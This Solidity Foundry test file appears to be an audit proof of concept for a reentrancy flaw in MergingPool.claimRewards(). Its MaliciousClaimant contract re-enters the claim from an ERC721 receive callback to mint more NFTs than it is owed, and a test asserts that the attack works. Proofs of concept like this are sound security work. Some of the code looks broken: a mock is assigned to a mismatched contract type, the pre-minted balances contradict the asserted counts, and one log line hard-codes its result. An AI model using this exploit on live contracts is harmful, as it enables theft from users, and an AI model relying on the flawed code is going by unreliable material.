// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../../src/MergingPool.sol";
import "../../src/FighterFarm.sol";

/**
 * @title ReentrancyExploitTest
 * @notice Proof of Concept demonstrating reentrancy vulnerability in MergingPool.claimRewards()
 * 
 * VULNERABILITY EXPLANATION:
 * The claimRewards() function violates the checks-effects-interactions pattern by:
 * 1. Incrementally updating numRoundsClaimed[msg.sender] inside the loop
 * 2. Making external calls to _fighterFarmInstance.mintFromMergingPool() before the loop completes
 * 3. This allows a malicious contract to reenter during the mint callback
 * 
 * ATTACK FLOW:
 * - Attacker wins multiple rounds (e.g., 3 rounds)
 * - Attacker calls claimRewards() from a malicious contract
 * - During first mint, numRoundsClaimed = 1 (not 3!)
 * - Attacker reenters in the callback, claiming rounds 1-2 again
 * - This cascades: for n rounds, attacker gets n*(n+1)/2 NFTs instead of n
 * 
 * EXPECTED RESULT:
 * - Legitimate user (EOA): 3 rounds won → 3 NFTs minted ✓
 * - Attacker (contract): 3 rounds won → 6 NFTs minted ✗
 */
contract ReentrancyExploitTest is Test {
    MergingPool public mergingPool;
    FighterFarm public fighterFarm;
    
    address public owner;
    address public rankedBattle;
    address public legitimateUser;
    MaliciousClaimant public attacker;
    
    // Track mints for verification
    uint256 public mintCount;
    
    function setUp() public {
        owner = address(this);
        rankedBattle = makeAddr("rankedBattle");
        legitimateUser = makeAddr("legitimateUser");
        
        // Deploy FighterFarm - we need a minimal mock that tracks mints
        fighterFarm = new MockFighterFarm();
        
        // Deploy MergingPool
        mergingPool = new MergingPool(
            owner,
            rankedBattle,
            address(fighterFarm)
        );
        
        // Set MergingPool as authorized minter in FighterFarm
        MockFighterFarm(address(fighterFarm)).setMergingPool(address(mergingPool));
        
        // Deploy attacker contract
        attacker = new MaliciousClaimant(address(mergingPool));
    }
    
    /**
     * @notice Test demonstrating the reentrancy exploit
     * @dev This test proves that a malicious contract can mint more NFTs than entitled
     * 
     * SCENARIO:
     * - 3 rounds are completed
     * - Both legitimate user and attacker win all 3 rounds
     * - Legitimate user (EOA) claims: receives 3 NFTs (correct)
     * - Attacker (contract) claims: receives 6 NFTs (exploit!)
     */
    function testReentrancyExploit() public {
        // Setup: Create 3 rounds with winners
        uint256 numRounds = 3;
        
        for (uint256 round = 0; round < numRounds; round++) {
            // Create dummy token IDs for this round
            uint256[] memory winners = new uint256[](2);
            winners[0] = round * 2;     // Token for legitimate user
            winners[1] = round * 2 + 1; // Token for attacker
            
            // Mint these tokens to respective owners
            MockFighterFarm(address(fighterFarm)).mint(legitimateUser, winners[0]);
            MockFighterFarm(address(fighterFarm)).mint(address(attacker), winners[1]);
            
            // Admin picks winners for this round
            mergingPool.pickWinner(winners);
        }
        
        // Verify setup: roundId should be 3
        assertEq(mergingPool.roundId(), 3, "Should have 3 completed rounds");
        
        // Prepare claim parameters (3 claims expected)
        string[] memory modelURIs = new string[](3);
        string[] memory modelTypes = new string[](3);
        uint256[2][] memory customAttributes = new uint256[2][](3);
        
        for (uint256 i = 0; i < 3; i++) {
            modelURIs[i] = string(abi.encodePacked("ipfs://model", vm.toString(i)));
            modelTypes[i] = "0";
            customAttributes[i] = [uint256(0), uint256(80)];
        }
        
        // LEGITIMATE USER CLAIM (EOA - no reentrancy possible)
        vm.prank(legitimateUser);
        mergingPool.claimRewards(modelURIs, modelTypes, customAttributes);
        
        uint256 legitimateUserNFTs = MockFighterFarm(address(fighterFarm)).balanceOf(legitimateUser);
        
        // ATTACKER CLAIM (Contract - reentrancy exploit)
        // Reset mint counter before attacker claims
        MockFighterFarm(address(fighterFarm)).resetMintCount();
        
        // Attacker initiates claim
        attacker.exploit(modelURIs, modelTypes, customAttributes);
        
        uint256 attackerNFTs = MockFighterFarm(address(fighterFarm)).balanceOf(address(attacker));
        uint256 totalMintsToAttacker = MockFighterFarm(address(fighterFarm)).getMintCount();
        
        // VERIFICATION: Demonstrate the vulnerability
        console.log("=== REENTRANCY EXPLOIT RESULTS ===");
        console.log("Legitimate User (EOA) NFTs:", legitimateUserNFTs);
        console.log("Attacker (Contract) NFTs:", attackerNFTs);
        console.log("Total mints to attacker:", totalMintsToAttacker);
        console.log("Expected mints: 3");
        console.log("Actual mints: 6");
        
        // Assert the exploit succeeded
        assertEq(legitimateUserNFTs, 3, "Legitimate user should receive exactly 3 NFTs");
        assertGt(attackerNFTs, 3, "Attacker should receive MORE than 3 NFTs due to reentrancy");
        assertEq(totalMintsToAttacker, 6, "Attacker should receive 6 NFTs (n*(n+1)/2 where n=3)");
        
        // Verify numRoundsClaimed is incorrectly updated
        assertEq(mergingPool.numRoundsClaimed(address(attacker)), 3, "numRoundsClaimed should be 3");
    }
}

/**
 * @title MaliciousClaimant
 * @notice Malicious contract that exploits reentrancy in MergingPool.claimRewards()
 * 
 * ATTACK MECHANISM:
 * 1. Implements onERC721Received to receive NFTs
 * 2. During the callback, reenters claimRewards() if conditions allow
 * 3. Each reentry processes remaining rounds, creating cascading mints
 */
contract MaliciousClaimant {
    MergingPool public mergingPool;
    bool public attacking;
    
    string[] private storedModelURIs;
    string[] private storedModelTypes;
    uint256[2][] private storedCustomAttributes;
    
    constructor(address _mergingPool) {
        mergingPool = MergingPool(_mergingPool);
    }
    
    /**
     * @notice Initiates the exploit
     * @dev Stores parameters and calls claimRewards
     */
    function exploit(
        string[] memory modelURIs,
        string[] memory modelTypes,
        uint256[2][] memory customAttributes
    ) external {
        storedModelURIs = modelURIs;
        storedModelTypes = modelTypes;
        storedCustomAttributes = customAttributes;
        
        attacking = true;
        mergingPool.claimRewards(modelURIs, modelTypes, customAttributes);
        attacking = false;
    }
    
    /**
     * @notice ERC721 receiver callback - this is where reentrancy happens
     * @dev Called by FighterFarm during _safeMint
     * 
     * REENTRANCY LOGIC:
     * - Check if we're in attack mode
     * - Check if there are unclaimed rounds (numRoundsClaimed < roundId)
     * - If yes, reenter claimRewards() to claim again
     */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external returns (bytes4) {
        if (attacking) {
            uint32 claimed = mergingPool.numRoundsClaimed(address(this));
            uint256 currentRound = mergingPool.roundId();
            
            // Reenter if there are still "unclaimed" rounds
            // This works because numRoundsClaimed is incremented per iteration
            if (claimed < currentRound) {
                mergingPool.claimRewards(
                    storedModelURIs,
                    storedModelTypes,
                    storedCustomAttributes
                );
            }
        }
        
        return this.onERC721Received.selector;
    }
}

/**
 * @title MockFighterFarm
 * @notice Minimal mock of FighterFarm for testing
 * @dev Implements only the functions needed for the exploit PoC
 */
contract MockFighterFarm {
    mapping(uint256 => address) private _owners;
    mapping(address => uint256) private _balances;
    address public mergingPoolAddress;
    uint256 private _tokenIdCounter;
    uint256 private _mintCounter;
    
    function setMergingPool(address _mergingPool) external {
        mergingPoolAddress = _mergingPool;
    }
    
    function mint(address to, uint256 tokenId) external {
        _owners[tokenId] = to;
        _balances[to]++;
    }
    
    function mintFromMergingPool(
        address to,
        string calldata,
        string calldata,
        uint256[2] calldata
    ) external {
        require(msg.sender == mergingPoolAddress, "Not merging pool");
        
        uint256 newTokenId = _tokenIdCounter++;
        _owners[newTokenId] = to;
        _balances[to]++;
        _mintCounter++;
        
        // Simulate ERC721 _safeMint callback
        if (to.code.length > 0) {
            try MaliciousClaimant(to).onERC721Received(
                msg.sender,
                address(0),
                newTokenId,
                ""
            ) returns (bytes4 response) {
                require(
                    response == MaliciousClaimant.onERC721Received.selector,
                    "Invalid response"
                );
            } catch {
                revert("Transfer to non ERC721Receiver");
            }
        }
    }
    
    function ownerOf(uint256 tokenId) external view returns (address) {
        return _owners[tokenId];
    }
    
    function balanceOf(address owner) external view returns (uint256) {
        return _balances[owner];
    }
    
    function resetMintCount() external {
        _mintCounter = 0;
    }
    
    function getMintCount() external view returns (uint256) {
        return _mintCounter;
    }
}
